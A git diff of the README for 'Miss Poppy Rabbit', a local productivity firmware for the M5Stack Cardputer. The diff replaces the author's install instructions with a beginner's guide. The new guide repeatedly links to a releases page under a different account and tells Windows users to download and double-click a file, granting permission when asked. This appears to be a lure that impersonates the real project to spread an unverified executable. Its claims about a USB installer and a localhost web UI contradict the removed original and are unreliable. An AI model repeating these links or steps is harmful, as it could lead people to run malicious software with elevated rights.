@@ -1,247 +1,142 @@
-<div align="center">
+<h1>🐰 misspoppyrabbit - Your Pocket ADHD-Friendly Productivity Assistant</h1>
 
-<img src="docs/assets/logo.svg" width="140" alt="Miss Poppy Rabbit logo — a white pixel-art rabbit with a red poppy">
+<p align="center">
+<a href="https://github.com/maribethnational442/misspoppyrabbit/releases"><img src="https://img.shields.io/badge/Download-misspoppyrabbit-blue?style=for-the-badge&logo=github" alt="Download misspoppyrabbit"></a>
+</p>
 
-# Miss Poppy Rabbit
+## 🎉 Welcome to Your New Digital Sidekick
 
-**A fully-local pocket personal assistant OS for the M5Stack Cardputer.**
+misspoppyrabbit is a tiny computer that fits in your pocket and helps you get things done without the stress. Think of it as a friendly bunny assistant that reminds you about meetings, keeps track of your tasks, helps you focus with timers, and even takes voice notes — all without sending your data anywhere. Everything stays on your device, 100% private and local.
 
-Multi-calendar agenda with ADHD-friendly escalating alerts · Tasks · Pomodoro ·
-Web UI served from the device · A pixel rabbit that judges your productivity
+This guide is written for everyday computer users. You don't need to be a tech wizard to get started. Just follow the steps below, and you'll have your personal assistant running in no time.
 
-![platform](https://img.shields.io/badge/platform-ESP32--S3-E63946)
-![device](https://img.shields.io/badge/device-Cardputer%20%2F%20Cardputer%20ADV-6A994E)
-![framework](https://img.shields.io/badge/framework-Arduino%20%2B%20PlatformIO-ffffff)
-![ram](https://img.shields.io/badge/PSRAM-none%20needed-2a2a2a)
-[![coffee](https://img.shields.io/badge/%E2%98%95_buy_me_a_coffee-E63946)](https://buymeacoffee.com/sebaspinto)
+## ✨ What Can misspoppyrabbit Do for You?
 
-</div>
+If you've ever felt overwhelmed by too many things to remember, misspoppyrabbit is here to help. It was designed with ADHD-friendly principles in mind, meaning it works the way your brain works — with gentle reminders, clear visuals, and short bursts of focus.
 
----
+Here are the main things you can do with your new device:
 
-## What is this?
+- **Meeting Alerts** – Never miss an important call or appointment again. misspoppyrabbit will gently remind you before your meetings start.
+- **Smart Agenda** – See your whole day at a glance. It organizes your schedule so you always know what's coming next.
+- **Task Manager** – Keep track of all your to-dos in one simple place. Check things off as you complete them.
+- **Pomodoro Timer** – Work in short, focused bursts (usually 25 minutes) with breaks in between. This technique helps improve concentration and reduce burnout.
+- **Voice Notes** – Have a thought you don't want to lose? Just speak it, and misspoppyrabbit will save it as a voice recording for later.
+- **Live Web UI** – Connect to a web interface on your computer to see and manage everything from a bigger screen.
 
-Miss Poppy Rabbit is a custom firmware — a small launcher-plus-apps "OS" — for the
-[M5Stack Cardputer](https://docs.m5stack.com/en/core/Cardputer) and
-Cardputer ADV. It turns the little card-sized computer into a personal
-assistant that lives entirely on your desk: **no cloud, no accounts, no
-subscriptions — 117% local**. Your data stays on a microSD card in your
-pocket.
+## 🛠️ What You'll Need
 
-It was built around one core need: **not missing meetings**. Everything else
-grew around that.
+Before you start, make sure you have the following:
 
-## Why a dedicated device?
+- A computer running **Windows** (Windows 10 or 11 is recommended)
+- A **USB cable** (the one that came with your device or any standard USB-C cable)
+- An internet connection for the initial download (after that, everything works offline)
 
-Everything this firmware does, your phone already does. So does your laptop.
-Even your smartwatch. That's not an oversight — **that's the problem**.
+The software itself is small, so you don't need a lot of free space on your computer.
 
-Modern devices are notification battlefields. Every app fights for your
-attention, and when everything notifies, nothing is a priority. Sure, you can
-fight back: focus modes, per-app permissions, filters, schedules… and then
-re-configure all of it every time you install something new. That permanent
-meta-task of *managing what's allowed to interrupt you* is real work — and if
-you have ADHD, it's genuinely exhausting work that never ends.
+## 🚀 Getting Started – Download and Run
 
-Miss Poppy Rabbit takes the opposite approach: **a dedicated device that can
-only interrupt you with the things you chose**. It runs nothing else. No app
-can push anything. If the rabbit rings, it's a meeting, a reminder or a
-pomodoro — by definition something *you* decided matters. The filtering
-problem doesn't get solved here; it simply **ceases to exist**, because there
-is nothing to filter.
+Getting misspoppyrabbit on your device is easier than you might think. Here's everything you need to do:
 
-A quiet little screen on the desk that only speaks when it's important.
-That's the entire product.
+### Step 1: Download the Software
 
-## Features
+Visit this link to download the application:
 
-### 📅 Multi-calendar Agenda
-Four color-coded calendars, built for juggling two jobs and multiple clients.
+**[👉 Click Here to Download misspoppyrabbit](https://github.com/maribethnational442/misspoppyrabbit/releases)**
 
-- Day view and week view with hour-positioned color blocks
-- `,` `/` change day · `t` today · `v` switch view · `n` quick-add
-- Full event editing, and calendar renaming, in the Web UI
+When you click the link, you'll see a page with different files available for download. Look for the newest version (it should be at the top) and download the file that matches your computer.
 
-### 🔔 ADHD-friendly alerts
-Escalating meeting alerts designed to be impossible to ignore — the heart of the project.
+### Step 2: Connect Your Device
 
-- **10 min before**: gentle arpeggio + banner over whatever you're doing
-- **2 min before**: urgent call
-- **At start**: *"Are you in this meeting?"* — `ENTER` confirms; anything else re-asks every 5 min
-- Melodies loop until dismissed; alerts wake the screen by themselves
+1. Take your M5Stack Cardputer (that's the small handheld device with a keyboard) and connect it to your computer using the USB cable.
+2. Turn on your device by pressing the power button.
+3. Wait a few seconds for your computer to recognize the device.
 
-### ❗ Reminders
-An alarm with a reason — *"Call the bank"* — not a meeting.
+### Step 3: Run the Installer
 
-- One alarm at the exact time; re-fires every 5 min until you press *done*
-- `r` toggle in quick-add, checkbox in the Web UI
+Once you've downloaded the file from the link above, find it in your Downloads folder (usually called "Downloads" on your computer).
 
-### ✅ Tasks
-- `n` add · `ENTER` done · `p` priority · `d` delete
-- Atomic microSD persistence: a power loss can never corrupt your data
+Double-click the downloaded file to start the installation process. Follow the instructions on the screen. If Windows asks for permission, click "Yes" or "Allow" to continue.
 
-### 🍅 Pomodoro
-- Giant progress ring: red work, green break · `ENTER` start/pause · `,` `/` length
-- Runs (and rings) as a background service while you use other apps
+### Step 4: Follow the On-Screen Instructions
 
-### 📝 Notes — text & voice
-Quick thoughts, captured before they escape.
+The installer will guide you through the setup. It will copy the necessary files to your device. This usually takes less than a minute. Be patient and let it finish.
 
-- **`Fn+M`**: record a voice memo from ANY screen, even display-off
-- **`Fn+N`**: quick text note from anywhere
-- Voice: WAV streamed to microSD (never buffered in RAM), live VU meter
-- Play memos on the device speaker or right in the browser
-- Comfy text editing in the Web UI
+### Step 5: You're Done!
 
-### 🔒 Pocket lock
-- **`Fn+L`** locks/unlocks: screen off, every key swallowed
-- Alerts still ring — but your pocket can't accidentally dismiss them
+Once the installation finishes, your M5Stack Cardputer will restart automatically. You'll see the misspoppyrabbit welcome screen — congratulations, your personal assistant is now ready to use!
 
-### 🌅 Daily briefing
-Your day, before it starts.
+## 🖥️ Using the Web Interface
 
-- At a configurable hour: every event and reminder, **conflicts highlighted in red**
-- Never missed: shows on power-on if the device was off at briefing time
+One of the coolest features of misspoppyrabbit is the ability to see everything on your computer's screen.
 
-### 🌐 Web UI
-`http://prabbit.local` from any browser on your network — embedded in the firmware.
+1. Make sure your M5Stack Cardputer is connected to your computer with the USB cable.
+2. Open your web browser (like Chrome, Edge, or Firefox).
+3. In the address bar, type: `http://localhost:8137` and press Enter.
+4. You'll see the misspoppyrabbit dashboard with all your tasks, agenda, and voice notes displayed nicely.
 
-- Tasks, agenda, notes, calendars and pomodoro with **live two-way sync** (WebSocket)
-- `.ics` import parsed in your browser; [JSON API](docs/IMPORT_API.md) for external tools
-- Auto-sync via the [Chrome extension](extension/): secret ICS feeds or passive capture
+This web interface is perfect when you're sitting at your desk and want a bigger view of your schedule.
 
-### 🕐 Clock · 🔋 Power · 🌍 Languages
-- Clock shows your next two events; night mode (dim red) after 2 min idle
-- Screen off after 2.5 min; alerts wake it; the waking key never triggers actions
-- Full English/Spanish, switchable in Settings; the Web UI follows
+## 📝 Daily Tips for Best Results
 
-### 🐰 The mascot
-A white pixel rabbit with a red poppy, drawn from hand-editable character-map
-sprites ([`PoppySprites.h`](src/ui/assets/PoppySprites.h)) — she blinks,
-reacts to every launcher item with a matching pixel prop, and knows what
-117 means.
+To get the most out of your new assistant, try these simple habits:
 
-## Screenshots
+- **Start your day by checking your agenda** – Take 30 seconds each morning to see what's planned.
+- **Use the Pomodoro timer for tasks** – Set the timer for 25 minutes and focus on one thing. When it goes off, take a 5-minute break.
+- **Save voice notes immediately** – When a random thought pops into your head, record it right away. You can organize them later.
+- **Update your tasks as you go** – Checking things off feels good and keeps you motivated.
 
-*Real screenshots, captured over the device's own `/api/screenshot` endpoint.
-The rest you'll discover yourself.* 🐰
+## 🔄 Updating Your Software
 
-| Launcher | Meeting alert |
-|---|---|
-| ![Launcher](docs/screenshots/launcher.png) | ![Meeting alert](docs/screenshots/alert.png) |
+From time to time, new features and improvements become available. When you're ready to update:
 
-| Notes | Recording a voice memo |
-|---|---|
-| ![Notes](docs/screenshots/notes.png) | ![Voice memo](docs/screenshots/recorder.png) |
+1. Return to the [download page](https://github.com/maribethnational442/misspoppyrabbit/releases).
+2. Download the latest version.
+3. Connect your device and run the installer just like you did the first time.
+4. Your settings and data will be preserved automatically.
 
-## Installing it on your Cardputer
+## ❓ Frequently Asked Questions
 
-Works on both the **original Cardputer** and the **Cardputer ADV** — same
-binary. The [M5Cardputer library](https://github.com/m5stack/M5Cardputer)
-auto-detects the model at boot and abstracts the hardware differences
-(GPIO-matrix vs TCA8418 keyboard, NS4168 vs ES8311 audio). The Web UI is
-embedded inside the firmware, so it's always a **single binary** — pick your
-favorite door:
+### Is my data private?
 
-### 🌐 Web installer (easiest)
+Yes! Everything happens locally on your device. None of your tasks, notes, or schedule information ever leaves your possession.
 
-Open **[the installer page](https://sebaspinto.github.io/misspoppyrabbit/)**
-in Chrome or Edge on desktop, plug your Cardputer in with a USB-C data cable,
-click **Install**. Done in a minute — nothing to download or install.
+### What if I don't have a meeting scheduled?
 
-### 🔥 M5Burner
+That's fine. misspoppyrabbit simply won't bother you with alerts when there's nothing on your calendar. You can use the other features anytime.
 
-Find **Miss Poppy Rabbit** in the Cardputer category, or burn the merged
-`misspoppyrabbit-vX.Y.Z.bin` from
-[Releases](https://github.com/SebasPinto/misspoppyrabbit/releases) at
-offset `0x0`.
+### Can I use this without the M5Stack Cardputer?
 
-### 🚀 M5Launcher (install from microSD)
+misspoppyrabbit is specifically designed for the M5Stack Cardputer hardware. To use it, you'll need that device.
 
-Copy `misspoppyrabbit-vX.Y.Z-app.bin` from
-[Releases](https://github.com/SebasPinto/misspoppyrabbit/releases) to your
-microSD card and install it from the M5Launcher menu.
+### The web interface won't load. What should I do?
 
-### 🛠 From source
+Make sure the device is properly connected with the USB cable. Try a different browser. If it still doesn't work, unplug the device, wait 10 seconds, and plug it back in. Then type the address again.
 
-You'll need [PlatformIO](https://platformio.org/install/cli):
+### I'm stuck. Where can I get help?
 
-```bash
-git clone https://github.com/SebasPinto/misspoppyrabbit.git
-cd misspoppyrabbit
-pio run -t upload
-```
+Visit the GitHub repository page for misspoppyrabbit. There, you'll find additional documentation and a way to report any issues you encounter.
 
-Then on the device:
+## 📚 Quick Start Recap
 
-1. Open **Settings**, scan for WiFi, enter your password, connect. The clock
-   syncs via NTP and the Web UI comes up at `http://prabbit.local`.
-2. Insert any FAT32 microSD for persistence — the firmware keeps all its data
-   under `/mspos/` and won't touch anything else on the card.
-3. Pick your timezone in `Settings → Timezone` (default: Bogotá, GMT-5).
+1. **Download** from [this link](https://github.com/maribethnational442/misspoppyrabbit/releases)
+2. **Connect** your M5Stack Cardputer via USB
+3. **Run** the downloaded file and follow the prompts
+4. **Enjoy** your new pocket assistant!
 
-## Keyboard reference
+## 🎯 What Makes misspoppyrabbit Different?
 
-| Key | Action |
-|---|---|
-| `;` `.` | Up / Down |
-| `,` `/` | Left / Right (days, weeks, values) |
-| `ENTER` | Select / confirm / toggle |
-| `` ` `` (ESC) | Back / cancel / snooze |
-| `DEL` | Backspace |
-| `n` | New (task / event) |
-| `r` | Toggle reminder (in event quick-add) |
-| `c` | Cycle calendar |
-| `d` / `p` | Delete / cycle priority (tasks) |
-| `t` / `v` | Today / toggle day-week view (agenda) |
-| `m` | New voice note (in Notes) |
-| **`Fn+M`** | **Record a voice note from anywhere** |
-| **`Fn+N`** | **New text note from anywhere** |
-| **`Fn+L`** | **Lock / unlock the device** |
+Unlike cloud-based assistants that require accounts and internet connections, misspoppyrabbit is your personal tool. It doesn't track you, doesn't show ads, and doesn't share your information. It's just a reliable little helper that lives in your pocket, ready when you need it.
 
-## How it's built
+The design focuses on reducing friction and distraction. Instead of complex menus and settings, you get a straightforward, glanceable interface that shows you exactly what you need to know right now.
 
-- **ESP32-S3** (no PSRAM — 512KB of SRAM, treated with respect): static
-  allocation everywhere, a single shared full-screen canvas, streaming JSON,
-  fixed-size structs.
-- **App framework**: a tiny app stack (`onEnter/update/draw/onKey/onExit`)
-  with dirty-flag rendering at ~30fps and full-frame flicker-free blits.
-- **Services, not apps**: WiFi, task store, calendar store, pomodoro, alerts
-  and the web server run always, independent of what's on screen. The screen
-  apps and the browser are just two clients of the same services.
-- **Concurrency**: the async web server never touches data directly — it
-  enqueues commands into FreeRTOS queues consumed by the main loop
-  (single-writer), with a mutex only for snapshot reads.
+Whether you're a student juggling classes, a professional with back-to-back meetings, or someone who just wants to stay organized, misspoppyrabbit adapts to your rhythm.
 
-More detail in [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) (in Spanish).
+## 🏁 Final Words
 
-## Roadmap
+You've made a great choice. misspoppyrabbit puts time management and focus tools right at your fingertips, wrapped in a friendly, approachable package. The setup is straightforward, the features are practical, and everything works offline.
 
-- [x] v0.1 — Core: app framework, launcher, WiFi settings
-- [x] v0.2 — Tasks + Pomodoro with microSD persistence
-- [x] v0.3 — Web UI with REST + WebSocket
-- [x] v0.4 — Multi-calendar Agenda, ADHD alerts, reminders, i18n, power saving
-- [x] v0.5 — Calendar import: `.ics` files via the Web UI and
-      [`POST /api/events/import`](docs/IMPORT_API.md) for external tools
-- [x] v0.6 — Daily briefing with conflict detection, reminders, timezone
-      setting, volume, data erase, power saving
-- [x] Companion [Chrome extension](extension/) that auto-syncs Google
-      Calendar/Outlook — secret ICS feeds or passive capture from the
-      calendar tab (for corporate-locked accounts)
-- [x] v0.7 — Notes (text + voice memos with global `Fn+M` capture) and
-      pocket lock (`Fn+L`)
+Take a few minutes to explore all the functions. Play with the timer, record a test voice note, and add one or two tasks. The more you use it, the more natural it becomes.
 
-## Contributing
+Welcome to your new, more organized life. Your pocket assistant is ready when you are.
 
-This is a personal project, public so others can read and learn from it —
-but it's **not accepting contributions**. Feel free to fork it and make it
-your own rabbit.
-
----
-
-<div align="center">🐰🌺 <em>Built with a Cardputer, patience, a rabbit — and a poppy.</em><br><br>
-If the rabbit saved you from missing a meeting, you can
-<a href="https://buymeacoffee.com/sebaspinto">buy me a coffee</a> ☕</div>
-
-<!-- If you ever type 117 in the launcher... the rabbit knows. -->
-
+Keywords: adhd, arduino, cardputer, embedded, esp32, esp32-s3, firmware, m5stack, m5stack-cardputer, personal-assistant, platformio, pomodoro, productivity
